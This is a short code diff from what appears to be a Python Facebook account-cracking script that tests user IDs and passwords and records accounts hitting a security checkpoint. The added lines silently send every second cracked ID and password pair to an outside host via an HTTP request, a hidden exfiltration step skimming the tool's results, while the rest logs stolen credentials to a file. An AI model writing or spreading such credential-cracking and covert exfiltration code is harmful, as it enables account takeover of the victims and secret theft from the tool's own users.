@@ -1343,10 +1343,15 @@ def mbasic(uid,pwx,tl):
                 else:
                    continue
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open("/sdcard/SUMON_file_CP.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid)
-                break
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    oks.append(cid)
+                    break
             else:
                 continue
         loop+=1
